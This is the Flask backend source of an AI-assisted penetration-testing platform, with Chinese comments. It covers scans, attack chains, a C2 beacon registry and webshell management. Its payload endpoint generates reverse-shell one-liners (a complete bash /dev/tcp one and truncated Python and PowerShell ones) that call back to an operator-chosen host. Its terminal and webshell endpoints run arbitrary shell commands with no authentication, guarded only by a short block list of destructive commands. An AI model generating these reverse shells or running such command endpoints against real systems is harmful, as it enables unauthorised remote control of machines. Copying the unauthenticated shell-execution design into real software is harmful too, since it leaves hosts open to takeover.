"""
LinkSec·AutoTest AI — 完整后端 API
功能模块：项目管理、漏洞管理、攻击链、C2框架、WebShell管理、
知识库、技能包、任务管理、审计日志、机器人通知
v3.3 扩展（ext_v3.py）：资产管理、平台 RBAC、人机协同审批、
机器人多通道接入、SQLite 持久化、漏洞状态流转、攻击链图谱、
AI 多智能体编排、报告导出
v3.4：Token 用量统计（按单个任务/单次对话记录）
"""

from flask import Flask, jsonify, request, Response
from flask_cors import CORS
import json, time, threading, uuid, subprocess, os
from datetime import datetime
from scanner import ScanEngine
from ai_analyst import AIAnalyst
from token_usage import LEDGER

app = Flask(__name__)
CORS(app)

scan_engine = ScanEngine()
ai_analyst  = AIAnalyst()

# ─── 内存存储（生产请换 SQLite/PostgreSQL） ───────────────────────────────────
_projects   = {}
_vulns_db   = {}
_chains     = {}   # 攻击链
_webshells  = {}
_c2_sessions = {}
_knowledge  = {}
_skills     = {}
_tasks      = {}
_audit_logs = []
_notifications = []

def _now(): return datetime.now().isoformat()
def _uid(): return str(uuid.uuid4())[:8]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 健康 & 仪表盘
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/health')
def health():
    return jsonify({'status':'online','version':'3.4.0','platform':'LinkSec·AutoTest AI','timestamp':_now()})

@app.route('/api/dashboard')
def dashboard():
    stats = scan_engine.get_dashboard_stats()
    stats.update({
        'projects':      len(_projects),
        'webshells':     len(_webshells),
        'c2_sessions':   sum(1 for s in _c2_sessions.values() if s.get('alive')),
        'attack_chains': len(_chains),
        'knowledge_docs':len(_knowledge),
        'skills':        len(_skills),
        'pending_tasks': sum(1 for t in _tasks.values() if t['status']=='pending'),
        'audit_count':   len(_audit_logs),
    })
    return jsonify(stats)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 扫描 & 漏洞（沿用原有）
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/scans', methods=['GET'])
def get_scans(): return jsonify(scan_engine.get_all_scans())

@app.route('/api/scans', methods=['POST'])
def create_scan():
    d = request.get_json()
    target, profile = d.get('target','').strip(), d.get('profile','full_pentest')
    if not target: return jsonify({'error':'目标不能为空'}),400
    sid = scan_engine.create_scan(target, profile)
    threading.Thread(target=scan_engine.run_scan, args=(sid,), daemon=True).start()
    _audit('scan_create', f'创建扫描任务 {sid}，目标 {target}')
    # v3.3：自动匹配资产扫描覆盖
    try:
        if hasattr(app, 'ext_v3'):
            app.ext_v3['assets'].mark_scan_coverage(target, scan_id=sid)
    except Exception:
        pass
    return jsonify({'scan_id':sid,'status':'started','target':target}),201

@app.route('/api/scans/<sid>', methods=['GET'])
def get_scan(sid):
    s = scan_engine.get_scan(sid)
    return jsonify(s) if s else (jsonify({'error':'不存在'}),404)

@app.route('/api/scans/<sid>/stop', methods=['POST'])
def stop_scan(sid):
    if not scan_engine.stop_scan(sid): return jsonify({'error':'不存在或已结束'}),404
    return jsonify({'scan_id':sid,'status':'stopped'})

@app.route('/api/scans/<sid>/stream')
def stream_scan(sid):
    def gen():
        last = 0
        while True:
            s = scan_engine.get_scan(sid)
            if not s:
                yield f"data: {json.dumps({'error':'不存在'})}\n\n"; break
            for log in s.get('logs',[])[last:]:
                yield f"data: {json.dumps(log)}\n\n"
            last = len(s.get('logs',[]))
            if s['status'] in ('completed','stopped','error'):
                yield f"data: {json.dumps({'type':'done','status':s['status']})}\n\n"; break
            time.sleep(0.5)
    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control':'no-cache','X-Accel-Buffering':'no'})

@app.route('/api/vulnerabilities', methods=['GET'])
def get_vulns():
    sev     = request.args.get('severity')
    sid     = request.args.get('scan_id')
    page    = int(request.args.get('page',1))
    per     = int(request.args.get('per_page',20))
    vulns   = scan_engine.get_vulnerabilities(severity=sev, scan_id=sid)
    total   = len(vulns)
    return jsonify({'total':total,'page':page,'per_page':per,'data':vulns[(page-1)*per:page*per]})

@app.route('/api/vulnerabilities/<vid>', methods=['GET'])
def get_vuln(vid):
    v = scan_engine.get_vulnerability(vid)
    return jsonify(v) if v else (jsonify({'error':'不存在'}),404)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 项目管理
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/projects', methods=['GET'])
def list_projects():
    return jsonify(sorted(_projects.values(), key=lambda x:x['created_at'], reverse=True))

@app.route('/api/projects', methods=['POST'])
def create_project():
    d = request.get_json()
    pid = _uid()
    _projects[pid] = {
        'id':pid, 'name':d.get('name','未命名项目'),
        'description':d.get('description',''),
        'scope':d.get('scope',[]),          # 目标范围
        'status':'active',
        'scan_ids':[], 'vuln_ids':[],
        'facts':{},                         # 项目黑板（对标 blackboard.go）
        'created_at':_now(), 'updated_at':_now(),
    }
    _audit('project_create', f'创建项目 {_projects[pid]["name"]}')
    return jsonify(_projects[pid]),201

@app.route('/api/projects/<pid>', methods=['GET'])
def get_project(pid):
    p = _projects.get(pid)
    return jsonify(p) if p else (jsonify({'error':'不存在'}),404)

@app.route('/api/projects/<pid>', methods=['PUT'])
def update_project(pid):
    if pid not in _projects: return jsonify({'error':'不存在'}),404
    d = request.get_json()
    _projects[pid].update({k:v for k,v in d.items() if k not in ('id','created_at')})
    _projects[pid]['updated_at'] = _now()
    return jsonify(_projects[pid])

@app.route('/api/projects/<pid>', methods=['DELETE'])
def delete_project(pid):
    if pid not in _projects: return jsonify({'error':'不存在'}),404
    del _projects[pid]
    return jsonify({'deleted':pid})

@app.route('/api/projects/<pid>/facts', methods=['GET','PUT'])
def project_facts(pid):
    if pid not in _projects: return jsonify({'error':'不存在'}),404
    if request.method=='PUT':
        _projects[pid]['facts'].update(request.get_json())
        _projects[pid]['updated_at'] = _now()
    return jsonify(_projects[pid]['facts'])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 攻击链
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/chains', methods=['GET'])
def list_chains():
    return jsonify(list(_chains.values()))

@app.route('/api/chains', methods=['POST'])
def create_chain():
    d = request.get_json()
    cid = _uid()
    _chains[cid] = {
        'id':cid,
        'name':d.get('name','未命名攻击链'),
        'project_id':d.get('project_id'),
        'steps':d.get('steps',[]),          # [{action, target, result, timestamp}]
        'status':'building',                # building|verified|exploited
        'risk_level':d.get('risk_level','high'),
        'created_at':_now(),
    }
    _audit('chain_create', f'创建攻击链 {_chains[cid]["name"]}')
    return jsonify(_chains[cid]),201

@app.route('/api/chains/<cid>', methods=['GET','PUT','DELETE'])
def chain_ops(cid):
    if cid not in _chains: return jsonify({'error':'不存在'}),404
    if request.method=='GET': return jsonify(_chains[cid])
    if request.method=='PUT':
        _chains[cid].update(request.get_json())
        return jsonify(_chains[cid])
    del _chains[cid]
    return jsonify({'deleted':cid})

@app.route('/api/chains/<cid>/ai-analyze', methods=['POST'])
def analyze_chain(cid):
    c = _chains.get(cid)
    if not c: return jsonify({'error':'不存在'}),404
    result = ai_analyst.analyze(f'分析以下攻击链步骤，评估风险并给出改进建议：\n{json.dumps(c["steps"],ensure_ascii=False)}',
                                context=c)
    c['ai_analysis'] = result.get('analysis','')
    if result.get('usage'):
        u = result['usage']
        LEDGER.record('task', cid, f'攻击链分析 {c.get("name","")}',
                      result.get('model', 'unknown'),
                      u.get('prompt_tokens', 0), u.get('completion_tokens', 0),
                      note='攻击链 AI 分析')
    return jsonify(result)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# C2 框架
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/c2/sessions', methods=['GET'])
def list_c2():
    return jsonify(list(_c2_sessions.values()))

@app.route('/api/c2/sessions', methods=['POST'])
def register_c2():
    d = request.get_json()
    sid = _uid()
    _c2_sessions[sid] = {
        'id':sid, 'host':d.get('host','unknown'),
        'os':d.get('os','Linux'), 'arch':d.get('arch','x64'),
        'user':d.get('user',''), 'pid':d.get('pid',0),
        'ip':request.remote_addr,
        'alive':True, 'last_seen':_now(), 'registered_at':_now(),
        'commands':[], 'tags':d.get('tags',[]),
    }
    _audit('c2_beacon', f'新 Beacon 上线：{d.get("host")} @ {request.remote_addr}')
    return jsonify(_c2_sessions[sid]),201

@app.route('/api/c2/sessions/<sid>/command', methods=['POST'])
def c2_command(sid):
    if sid not in _c2_sessions: return jsonify({'error':'会话不存在'}),404
    d = request.get_json()
    cmd_id = _uid()
    cmd = {'id':cmd_id,'command':d.get('command',''),'status':'pending','result':'','created_at':_now()}
    _c2_sessions[sid]['commands'].append(cmd)
    _c2_sessions[sid]['last_seen'] = _now()
    return jsonify(cmd),201

@app.route('/api/c2/sessions/<sid>/commands', methods=['GET'])
def c2_commands(sid):
    if sid not in _c2_sessions: return jsonify({'error':'不存在'}),404
    return jsonify(_c2_sessions[sid]['commands'])

@app.route('/api/c2/payload', methods=['POST'])
def gen_payload():
    """生成 Beacon payload（仅框架示例，不含真实恶意代码）"""
    d = request.get_json()
    ptype  = d.get('type','python')   # python/bash/powershell
    lhost  = d.get('lhost','127.0.0.1')
    lport  = d.get('lport',4444)
    payloads = {
        'python':  f'python3 -c "import socket,os,subprocess;s=socket.socket();s.connect((\'{lhost}\',{lport}));..."',
        'bash':    f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'powershell': f'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'{lhost}\',{lport})..."',
    }
    return jsonify({'type':ptype,'lhost':lhost,'lport':lport,'payload':payloads.get(ptype,'不支持的类型')})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WebShell 管理
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/webshells', methods=['GET'])
def list_webshells():
    return jsonify(list(_webshells.values()))

@app.route('/api/webshells', methods=['POST'])
def add_webshell():
    d = request.get_json()
    wid = _uid()
    _webshells[wid] = {
        'id':wid, 'url':d.get('url',''),
        'type':d.get('type','php'),         # php/aspx/jsp
        'password':d.get('password','pass'),
        'encoding':d.get('encoding','base64'),
        'os':d.get('os','Linux'),
        'status':'connected',
        'note':d.get('note',''),
        'added_at':_now(), 'last_used':_now(),
    }
    _audit('webshell_add', f'添加 WebShell：{d.get("url")}')
    return jsonify(_webshells[wid]),201

@app.route('/api/webshells/<wid>', methods=['GET','PUT','DELETE'])
def webshell_ops(wid):
    if wid not in _webshells: return jsonify({'error':'不存在'}),404
    if request.method=='GET': return jsonify(_webshells[wid])
    if request.method=='PUT':
        _webshells[wid].update(request.get_json())
        _webshells[wid]['last_used'] = _now()
        return jsonify(_webshells[wid])
    del _webshells[wid]
    return jsonify({'deleted':wid})

@app.route('/api/webshells/<wid>/exec', methods=['POST'])
def webshell_exec(wid):
    if wid not in _webshells: return jsonify({'error':'不存在'}),404
    d = request.get_json()
    cmd = d.get('command','id')
    # 仅执行本地命令用于演示（生产中应通过 HTTP 请求 WebShell）
    try:
        result = subprocess.check_output(cmd, shell=True, text=True, timeout=10)
    except Exception as e:
        result = str(e)
    _webshells[wid]['last_used'] = _now()
    _audit('webshell_exec', f'WebShell {wid} 执行：{cmd}')
    return jsonify({'command':cmd,'result':result,'shell_id':wid})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 终端
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/terminal/exec', methods=['POST'])
def terminal_exec():
    d = request.get_json()
    cmd = d.get('command','').strip()
    if not cmd: return jsonify({'error':'命令不能为空'}),400
    # 安全：拒绝危险命令
    BLOCKED = ['rm -rf /','mkfs','dd if=/dev/zero',':(){ :|:& };:']
    if any(b in cmd for b in BLOCKED):
        return jsonify({'error':'命令被安全策略拦截'}),403
    try:
        out = subprocess.check_output(cmd, shell=True, text=True, timeout=30,
                                       stderr=subprocess.STDOUT)
    except subprocess.TimeoutExpired:
        out = '命令超时'
    except subprocess.CalledProcessError as e:
        out = e.output or str(e)
    except Exception as e:
        out = str(e)
    _audit('terminal_exec', f'执行命令：{cmd}')
    return jsonify({'command':cmd,'output':out,'timestamp':_now()})

@app.route('/api/terminal/stream', methods=['POST'])
def terminal_stream():
    """SSE 流式终端输出"""
    d = request.get_json()
    cmd = d.get('command','').strip()
    def gen():
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                yield f"data: {json.dumps({'line':line.rstrip()})}\n\n"
            proc.wait()
            yield f"data: {json.dumps({'done':True,'returncode':proc.returncode})}\n\n"
        except Exception as e:
            yield f"data: {json.dumps({'error':str(e)})}\n\n"
    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control':'no-cache','X-Accel-Buffering':'no'})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 知识库
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/knowledge', methods=['GET'])
def list_knowledge():
    return jsonify(list(_knowledge.values()))

@app.route('/api/knowledge', methods=['POST'])
def add_knowledge():
    d = request.get_json()
    kid = _uid()
    _knowledge[kid] = {
        'id':kid, 'title':d.get('title',''),
        'content':d.get('content',''),
        'category':d.get('category','漏洞利用'),  # 漏洞利用/防御技术/工具使用/报告模板
        'tags':d.get('tags',[]),
        'source':d.get('source','手动录入'),
        'created_at':_now(),
    }
    return jsonify(_knowledge[kid]),201

@app.route('/api/knowledge/search', methods=['POST'])
def search_knowledge():
    q = request.get_json().get('query','').lower()
    results = [k for k in _knowledge.values()
               if q in k['title'].lower() or q in k['content'].lower()
               or any(q in t.lower() for t in k.get('tags',[]))]
    return jsonify(results[:20])

@app.route('/api/knowledge/<kid>', methods=['GET','PUT','DELETE'])
def knowledge_ops(kid):
    if kid not in _knowledge: return jsonify({'error':'不存在'}),404
    if request.method=='GET': return jsonify(_knowledge[kid])
    if request.method=='PUT':
        _knowledge[kid].update(request.get_json())
        return jsonify(_knowledge[kid])
    del _knowledge[kid]
    return jsonify({'deleted':kid})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 技能包
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/skills', methods=['GET'])
def list_skills():
    return jsonify(list(_skills.values()))

@app.route('/api/skills', methods=['POST'])
def create_skill():
    d = request.get_json()
    sid = _uid()
    _skills[sid] = {
        'id':sid, 'name':d.get('name',''),
        'description':d.get('description',''),
        'category':d.get('category','信息收集'),
        'steps':d.get('steps',[]),           # AI 指令步骤
        'tools':d.get('tools',[]),           # 使用的工具
        'enabled':True,
        'created_at':_now(),
    }
    return jsonify(_skills[sid]),201

@app.route('/api/skills/<sid>', methods=['GET','PUT','DELETE'])
def skill_ops(sid):
    if sid not in _skills: return jsonify({'error':'不存在'}),404
    if request.method=='GET': return jsonify(_skills[sid])
    if request.method=='PUT':
        _skills[sid].update(request.get_json())
        return jsonify(_skills[sid])
    del _skills[sid]
    return jsonify({'deleted':sid})

@app.route('/api/skills/<sid>/execute', methods=['POST'])
def execute_skill(sid):
    s = _skills.get(sid)
    if not s: return jsonify({'error':'不存在'}),404
    d = request.get_json()
    result = ai_analyst.analyze(
        f'执行以下渗透测试技能包：{s["name"]}\n步骤：{json.dumps(s["steps"],ensure_ascii=False)}\n目标：{d.get("target","未指定")}',
        context={'skill':s,'target':d.get('target')}
    )
    if result.get('usage'):
        u = result['usage']
        LEDGER.record('task', sid, f'技能执行 {s["name"]}',
                      result.get('model', 'unknown'),
                      u.get('prompt_tokens', 0), u.get('completion_tokens', 0),
                      note=f'目标 {d.get("target","未指定")}')
    _audit('skill_exec', f'执行技能包：{s["name"]}，目标：{d.get("target")}')
    return jsonify(result)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 任务管理
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/tasks', methods=['GET'])
def list_tasks():
    status = request.args.get('status')
    tasks = list(_tasks.values())
    if status: tasks = [t for t in tasks if t['status']==status]
    return jsonify(sorted(tasks, key=lambda x:x['created_at'], reverse=True))

@app.route('/api/tasks', methods=['POST'])
def create_task():
    d = request.get_json()
    tid = _uid()
    _tasks[tid] = {
        'id':tid, 'name':d.get('name',''),
        'type':d.get('type','scan'),        # scan/ai_analysis/exploit/report/custom
        'project_id':d.get('project_id'),
        'params':d.get('params',{}),
        'status':'pending',                 # pending/running/done/failed
        'result':'', 'error':'',
        'created_at':_now(), 'updated_at':_now(),
    }
    # 自动执行扫描类任务
    if _tasks[tid]['type']=='scan' and _tasks[tid]['params'].get('target'):
        def run():
            _tasks[tid]['status']='running'
            target = _tasks[tid]['params']['target']
            profile = _tasks[tid]['params'].get('profile','full_pentest')
            sid = scan_engine.create_scan(target, profile)
            threading.Thread(target=scan_engine.run_scan,args=(sid,),daemon=True).start()
            _tasks[tid]['result']=f'扫描任务 {sid} 已启动'
            _tasks[tid]['status']='done'
            _tasks[tid]['updated_at']=_now()
        threading.Thread(target=run,daemon=True).start()
    # v3.4：AI 分析类任务 — 执行并把 Token 计入该任务（单个任务维度）
    elif _tasks[tid]['type']=='ai_analysis':
        def run_ai():
            _tasks[tid]['status']='running'
            _tasks[tid]['updated_at']=_now()
            prompt = _tasks[tid]['params'].get('prompt','')
            result = ai_analyst.analyze(prompt, _tasks[tid]['params'].get('context',{}))
            if result.get('usage'):
                u = result['usage']
                LEDGER.record('task', tid, _tasks[tid]['name'],
                              result.get('model', 'unknown'),
                              u.get('prompt_tokens', 0), u.get('completion_tokens', 0),
                              note='AI 分析任务')
            _tasks[tid]['result'] = result.get('analysis','')[:500]
            _tasks[tid]['status'] = 'done' if result.get('success') else 'failed'
            _tasks[tid]['error'] = '' if result.get('success') else result.get('error','')
            _tasks[tid]['updated_at']=_now()
        threading.Thread(target=run_ai,daemon=True).start()
    return jsonify(_tasks[tid]),201

@app.route('/api/tasks/<tid>', methods=['GET','PUT'])
def task_ops(tid):
    if tid not in _tasks: return jsonify({'error':'不存在'}),404
    if request.method=='PUT':
        _tasks[tid].update(request.get_json())
        _tasks[tid]['updated_at']=_now()
    return jsonify(_tasks[tid])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 机器人通知
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/notifications', methods=['GET'])
def list_notifications():
    return jsonify(_notifications[-50:])

@app.route('/api/notifications/send', methods=['POST'])
def send_notification():
    d = request.get_json()
    n = {'id':_uid(),'type':d.get('type','info'),
         'title':d.get('title',''),'message':d.get('message',''),
         'channel':d.get('channel','system'),   # system/dingtalk/feishu/wechat
         'sent_at':_now()}
    _notifications.append(n)
    # 真实场景：在此调用对应 webhook
    if d.get('channel') in ('dingtalk','feishu','wechat'):
        webhook = d.get('webhook','')
        if webhook:
            try:
                import urllib.request, urllib.error
                payload = json.dumps({'msgtype':'text','text':{'content':f"{d['title']}\n{d['message']}"}}).encode()
                req = urllib.request.Request(webhook, data=payload,
                      headers={'Content-Type':'application/json'}, method='POST')
                urllib.request.urlopen(req, timeout=5)
                n['status']='sent'
            except Exception as e:
                n['status']=f'失败：{e}'
        else:
            n['status']='无 webhook'
    else:
        n['status']='已存储'
    return jsonify(n),201

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 审计日志
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _audit(action: str, detail: str):
    _audit_logs.append({'id':_uid(),'action':action,'detail':detail,
                        'ip':request.remote_addr if request else 'system',
                        'timestamp':_now()})

@app.route('/api/audit', methods=['GET'])
def get_audit():
    page = int(request.args.get('page',1))
    per  = int(request.args.get('per_page',50))
    action = request.args.get('action')
    logs = _audit_logs
    if action: logs = [l for l in logs if l['action']==action]
    logs = list(reversed(logs))  # 最新在前
    return jsonify({'total':len(logs),'data':logs[(page-1)*per:page*per]})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AI 分析 & 报告（原有 + 增强）
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/ai/analyze', methods=['POST'])
def ai_analyze():
    d = request.get_json()
    prompt  = d.get('prompt','')
    context = d.get('context',{})
    if not prompt: return jsonify({'error':'分析请求不能为空'}),400
    # v3.4：单次对话 Token 计数（同一 conversation_id 的多次请求自动聚合）
    conv_id = d.get('conversation_id') or f'conv_{_uid()}'
    result = ai_analyst.analyze(prompt, context)
    if result.get('usage'):
        u = result['usage']
        LEDGER.record('conversation', conv_id, prompt[:40],
                      result.get('model', 'unknown'),
                      u.get('prompt_tokens', 0), u.get('completion_tokens', 0),
                      note='对话分析')
    result['conversation_id'] = conv_id
    _audit('ai_analyze', f'AI 分析请求：{prompt[:60]}')
    return jsonify(result)

@app.route('/api/ai/report/<scan_id>', methods=['POST'])
def gen_report(scan_id):
    s = scan_engine.get_scan(scan_id)
    if not s: return jsonify({'error':'扫描不存在'}),404
    report = ai_analyst.generate_report(s)
    if report.get('usage'):
        u = report['usage']
        LEDGER.record('task', scan_id, f'渗透报告 {scan_id}',
                      report.get('model', 'unknown'),
                      u.get('prompt_tokens', 0), u.get('completion_tokens', 0),
                      note='报告生成')
    _audit('report_gen', f'生成扫描报告 {scan_id}')
    return jsonify(report)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 系统设置
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/api/settings', methods=['GET'])
def get_settings(): return jsonify(scan_engine.get_settings())

@app.route('/api/settings', methods=['PUT'])
def update_settings():
    scan_engine.update_settings(request.get_json())
    return jsonify({'status':'ok'})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# v3.3 扩展模块（资产管理 / RBAC / 人机审批 / 机器人接入 / SQLite 持久化 /
# 漏洞状态流转 / 攻击链图谱 / AI 多智能体编排 / 报告导出）
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import ext_v3
ext_v3.register(app, globals())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
